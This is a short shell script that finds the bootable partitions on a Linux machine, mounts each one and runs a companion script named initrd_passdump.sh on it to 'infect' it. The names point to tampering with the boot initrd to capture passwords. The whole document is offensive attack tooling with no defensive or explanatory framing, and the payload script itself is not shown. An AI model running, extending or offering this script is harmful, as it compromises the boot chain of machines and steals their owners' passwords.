#!/bin/sh

sector_lines="`/sbin/fdisk -l 2> /dev/null  | /bin/grep '^/dev/'`"
sectors=`echo "$sector_lines" | /bin/grep "\*" | /bin/sed 's#^\(/dev/[a-zA-Z1-9]*\).*#\1#'`


echo "Boot sectors are: $sectors"

bootroot="/mnt/boot_infect"
mkdir -p $bootroot/boot

for sector in $sectors; do
    echo "*** Mounting $sector"
    mount $sector $bootroot/boot
    echo "*** Infection..."
    if ./initrd_passdump.sh $bootroot; then
        echo "*** Infected."
    else
        echo "*** Error during infection of $sector"
    fi

    umount $bootroot/boot
done

